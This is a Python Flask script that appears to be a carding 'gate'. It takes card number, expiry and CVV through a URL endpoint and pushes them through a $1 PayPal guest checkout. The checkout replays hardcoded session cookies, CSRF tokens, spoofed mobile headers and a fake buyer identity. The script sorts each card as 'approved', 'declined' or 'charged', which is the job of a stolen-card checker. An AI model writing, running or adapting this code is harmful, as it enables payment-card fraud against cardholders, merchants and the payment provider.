import requests
import json
import logging
from flask import Flask, jsonify
import re

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Flask App
app = Flask(__name__)

# --- Status Mapping Rules ---
# Define the sets of codes for each status
APPROVED_CODES = {"INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED"}
DECLINED_CODES = {
    "CARD_GENERIC_ERROR",
    "COUNTRY_NOT_SUPPORTED",
    "EXPIRED_CARD",
    "VALIDATION_ERROR",
    "LOGIN_ERROR",
    "RISK_DISALLOWED"
}

def process_paypal_payment(card_details_string):
    """
    Processes the PayPal payment using the provided card details string.
    The string should be in the format: 'card_number|mm|yy|cvv'
    Returns a dictionary with 'code' and 'message' from the PayPal response.
    """
    try:
        # --- 1. Parse and Validate Card Details ---
        parts = card_details_string.split('|')
        if len(parts) != 4:
            return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid input format. Expected: card_number|mm|yy|cvv'
            }

        card_number, month, year, cvv = [p.strip() for p in parts]

        # Validate month
        if not month.isdigit() or len(month) != 2 or not (1 <= int(month) <= 12):
            return {
                'code': 'INVALID_MONTH',
                'message': 'Invalid expiration month provided.'
            }

        # Validate and format year (handle yy or yyyy)
        if not year.isdigit():
            return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid expiration year format.'
            }
        if len(year) == 2:
            year = '20' + year
        elif len(year) != 4:
             return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid expiration year format.'
            }
        
        # Validate CVV
        if not cvv.isdigit() or not (3 <= len(cvv) <= 4):
            return {
                'code': 'VALIDATION_ERROR',
                'message': 'Invalid CVV format.'
            }

        # Format expiry date as MM/YYYY
        expiry_date = f"{month}/{year}"

        # Determine card type
        if card_number.startswith('4'):
            card_type = 'VISA'
        elif card_number.startswith('5'):
            card_type = 'MASTER_CARD'
        elif card_number.startswith('3'):
            card_type = 'AMEX'
        else:
            card_type = 'UNKNOWN' # Fallback

        # Determine currency conversion type based on card type
        # AMEX cards need VENDOR currency conversion type
        if card_type == 'AMEX':
            currency_conversion_type = 'VENDOR'
        else:
            currency_conversion_type = 'PAYPAL'

        card_details = {
            'cardNumber': card_number,
            'type': card_type,
            'expirationDate': expiry_date,
            'securityCode': cvv,
            'postalCode': '10010'
        }

        # --- 2. Execute PayPal Request Sequence ---
        
        # Updated cookies
        cookies = {
            'cookie_check': 'yes',
            'd_id': '12922161e46740a7acc87901fe7324831759913487189',
            'TLTDID': '80877570812458672724967916669905',
            'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'H7TsI84-o0Zr9N4kGUDJtKazmaL7rM8R6DzyURNG1knPzAJaJ_pnZ7NRuAGFBktf3LcAIPy8Y_E7NtK0',
            'sc_f': '9H4wGeIJdGerRjM3qB0tbYn--97zvTburDnoV5z2DL5pvS-vqTG_td9_qT7KOZ3hC3L8biDI-YjjF7koRzbKhTfUIW6b7Hdw0BjD7W',
            'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
            '_gcl_au': '1.1.1110398748.1761806557',
            '_gid': 'GA1.2.78159526.1762933846',
            'ui_experience': 'did_set%3Dtrue',
            'enforce_policy': 'gdpr_v2.1',
            '_ga_FQYH6BLY4K': 'GS1.1.1762970377.2.0.1762970377.0.0.0',
            'cf_clearance': 'DZpsMmtsNWdBjkt8Q016qfJ6V27sWXLV5nR7.Ytu3sk-1762971274-1.2.1.1-DL_yGY14LI0ZVaQp0dfLoZRI5nROygMXs2BpslSfiq5iiyqRJ3gyWai5aXegckhcauoH0N0T7Cg1.pPaeAMcBH0LMf95tfzws2cd_ub6BoZKoKoIhXD_YZzbGoTwdahPY9kcfmrZNxtFZYbVbWmUGCwlh11P00xCeG1rPrvUYZK08N7WlEi0ObutDXVRTg_gT4MqRwYkUejAjSr4hs16v3XnYioNIZFiAx9wOz6mY.Q',
            '_ga': 'GA1.2.675632114.1761761444',
            'LANG': 'en_US%3BUS',
            'x-csrf-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjdhRzMxZHhWMFhZM3dHQTZhSDI1N213allabzFFZkxZZDNVc2tKcGN2bmdXR1BFcjFVNkZiaTNCSDAtRHcwRHBWMWt3cW9DQ2oyTDI4SWJmQlhKTWFaYVUtT1NVdmhKU0w3U2ZSYzZFZ2hzU2Z6RG1zbkh4QUJPc05oQXhJOXZhRW1VNjhVVm1uR25UYzgyMUFZQk9GMEU3TVdMWlJGeEhhRFNDQ3JYQmh6bFhXd0dmVE1QdzdKVXJUbmkiLCJpYXQiOjE3NjMwMTcxMTAsImV4cCI6MTc2MzAyMDcxMH0.9sr06U4sy5w6mVM1UI67r06B0Mw532EtVct59lq2Wt8',
            '_iidt': 'Ee+0AuoyDP98sD+7esqH/QouklwDHrZESG75LFPKmPTjXJHtiwhdrPUgU+tEAz3of/XDdACMLrOCC4bbkdo7YQDBu+wC0JVP0aqx0Jo=',
            'rmuc': 'Ib4jqFYhYkRkf0-n7C79_yKDrW5jDZxik4bbfxJ8sE7XaHqV9od4Cy-6bZw1jvtJeDtsf6jvstYxXldxl31j6x7H9j0PV2zY77tJK0XVcp0aCsSF4yHvmTL4V47mpMpXgBfMrHlvWNDxV4wWWycNxPFU9OhaSNSTLf5L6m',
            'SEGM': 'bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ',
            'nsid': 's%3AuvQa5zl3FDLmN7HqnHQ9ZO6zOQ_Ms8Qy.H8jz9urmBmjBplsP7xGMxSlmRHUnTkeiBk%2Bx4A3MxEE',
            'TLTSID': '71778317580319994566665135233870',
            'datadome': 'wmHhFJFCQTQ0G3c0Q1xN2LrtL63tAsMRGRka4zXOGIYDVF1X0DquUOzV3DpZm4TQB9JxtIf_Pbgd99A6_4TkDd1xVOa~G9Z9Rn3~pIK5wCSgn_Zn9ejioOH7Z4nQT3jP',
            '_cfuvid': 'W86WzOT4xdTdbdGGvSgq6wWVqL.m9Pp4TMhW7.TRZiw-1763033243208-0.0.1.1-604800000',
            'ts_c': 'vr%3Db9d519811990accc283435ebff39312f%26vt%3D7d51014319a0a5542019d918fd93bb99',
            'login_email': 'rocky%40gmail.com',
            'ddi': 'QVEEgPZ9nqVNiMRRbGKhbP6QaLoJdMP_Gs0fcyCMLuiyj_M92doqyOHg-MK2m-NgEycsHRw-5QhBIBWFQK-H8RpPaZVQrUW4i7IYlgCu2ut-ERyF',
            'l7_az': 'dcg15.slc',
            'tsrce': 'cspreportnodeweb',
            '_gat_gtag_UA_53389718_12': '1',
            'x-pp-s': 'eyJ0IjoiMTc2MzA0Mjc1NjcwOSIsImwiOiIwIiwibSI6IjAifQ',
            'ts': 'vreXpYrS%3D1794578757%26vteXpYrS%3D1763044557%26vr%3Db9d519811990accc283435ebff39312f%26vt%3D7d51014319a0a5542019d918fd93bb99%26vtyp%3Dreturn',
            '_dd_s': 'aid=20rugcqkur&rum=2&id=7a772a70-1c06-486b-82f9-06df5c94c4d4&created=1763042754290&expire=1763043655298',
        }

        # Request 2: PayPal Payment Page (Updated headers)
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '"64"',
            'sec-ch-ua-full-version': '"142.0.7444.135"',
            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.135", "Google Chrome";v="142.0.7444.135", "Not_A Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Nexus 5"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"6.0"',
            'sec-ch-ua-wow64': '?0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
        }
        requests.get('https://www.paypal.com/ncp/payment/R2FGT68WSSRLW', cookies=cookies, headers=headers, timeout=10)

        # Request 3: Create Order
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://www.paypal.com/ncp/payment/R2FGT68WSSRLW',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '"64"',
            'sec-ch-ua-full-version': '"142.0.7444.135"',
            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.135", "Google Chrome";v="142.0.7444.135", "Not_A Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Nexus 5"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"6.0"',
            'sec-ch-ua-wow64': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': '00-0000000000000000e1742ccfe460d3b0-4a57ee7fce68539d-01',
            'tracestate': 'dd=s:1;o:rum',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
            'x-csrf-token': 'dHKSl2Liu3Kc0cI4Kjvy5VVK4vvKSAbs5bJRo=',
            'x-datadog-origin': 'rum',
            'x-datadog-parent-id': '5357012514471695261',
            'x-datadog-sampling-priority': '1',
            'x-datadog-trace-id': '16245659027233625008',
        }
        
        json_data = {
            'link_id': 'R2FGT68WSSRLW',
            'merchant_id': '32BACX6X7PYMG',
            'quantity': '1',
            'amount': '1',
            'currency': 'USD',
            'currencySymbol': '$',
            'funding_source': 'CARD',
            'button_type': 'VARIABLE_PRICE',
            'csrfRetryEnabled': True,
        }
        
        response = requests.post('https://www.paypal.com/ncp/api/create-order', cookies=cookies, headers=headers, json=json_data, timeout=10)
        response_data = response.json()
        
        # Extract the token from the response
        if 'context_id' not in response_data:
            return {
                'code': 'TOKEN_EXTRACTION_ERROR',
                'message': 'Failed to extract token from PayPal response.'
            }
        
        token = response_data['context_id']
        csrf_token = response_data.get('csrfToken', '')
        
        # Request 4: Submit Card Details (Updated headers and token)
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'paypal-client-context': token,
            'paypal-client-metadata-id': token,
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': f'https://www.paypal.com/smart/card-fields?token={token}&sessionID=uid_3343f8e4cd_mtq6mdu6ntu&buttonSessionID=uid_3ecbcad4f0_mtq6mdy6mzq&locale.x=en_US&commit=true&style.submitButton.display=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhJOXVmRTBTMmNiRlhFaTcxa0hSdTlNYVFiTjAxVVlQdVFpZEp4akVfdDAwWWs2TmRTcjBqb1hodDRaM05Odnc2cGpaU0NxRy1wOTlGWlMmbWVyY2hhbnQtaWQ9MzJCQUNYNlg3UFlNRyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZjdXJyZW5jeT1VU0QmbG9jYWxlPWVuX1VTJmVuYWJsZS1mdW5kaW5nPXZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1jc3Atbm9uY2UiOiJkeHBBaHhPd3NXMDZJaWlFR3p1c3RxVFY3Q2FtckRJWEdvdHA1SUt6Q1pzNkhCUkQiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9nbXVkdHBsc2dtb2JycHp4YmNrcWlsdnZmYm50amsifX0&disable-card=',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-arch': '""',
            'sec-ch-ua-bitness': '"64"',
            'sec-ch-ua-full-version': '"142.0.7444.135"',
            'sec-ch-ua-full-version-list': '"Chromium";v="142.0.7444.135", "Google Chrome";v="142.0.7444.135", "Not_A Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Nexus 5"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"6.0"',
            'sec-ch-ua-wow64': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36',
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }
        
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': token,  # Using the extracted token
                'card': card_details, 
                'phoneNumber': '4073320637',
                'firstName': 'Rockcy', 
                'lastName': 'og',
                'billingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'shippingAddress': {'givenName': 'Rockcy', 'familyName': 'og', 'line1': '15th street', 'line2': '12', 'city': 'ny', 'state': 'NY', 'postalCode': '10010', 'country': 'US'},
                'email': 'rocky2@gmail.com', 
                'currencyConversionType': currency_conversion_type,  # Using the determined currency conversion type
            }, 
            'operationName': None,
        }
        
        response = requests.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=cookies, headers=headers, json=json_data, timeout=20)
        response_data = response.json()

        # --- 3. Parse PayPal Response ---
        # Default to success if no errors are present
        result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}

        if 'errors' in response_data and response_data['errors']:
            # Extract the first error code and message
            error_data = response_data['errors'][0]
            result['code'] = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
            result['message'] = error_data.get('message', 'An unknown error occurred.')
        
        return result

    except requests.exceptions.RequestException as e:
        logging.error(f"Network error during PayPal processing: {e}")
        return {'code': 'NETWORK_ERROR', 'message': 'Could not connect to payment gateway.'}
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        return {'code': 'INTERNAL_ERROR', 'message': 'An internal server error occurred.'}


@app.route('/gate=pp1/cc=<card_details>')
def payment_gateway(card_details):
    """
    Main endpoint to process a payment.
    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}
    """
    logging.info(f"Received payment request for card ending in {card_details[-4:]}")
    
    # Step 1: Process the payment and get the raw result
    result = process_paypal_payment(card_details)
    
    # Step 2: Determine the final status based on the result's code
    code = result.get('code')
    
    # The INVALID_MONTH case is already handled by the processing function
    if code in APPROVED_CODES:
        status = 'approved'
    elif code in DECLINED_CODES or code == 'INVALID_MONTH':
        status = 'declined'
    else:
        # Any other code, including success codes, results in 'charged'
        status = 'charged'

    # Step 3: Construct and return the final JSON response
    final_response = {
        "status": status,
        "code": code,
        "message": result.get('message')
    }
    
    logging.info(f"Transaction result: {final_response}")
    return jsonify(final_response)


if __name__ == '__main__':
    # Running the app on 0.0.0.0 makes it accessible from other devices on the same network
    app.run(host='0.0.0.0', port=5000, debug=True)
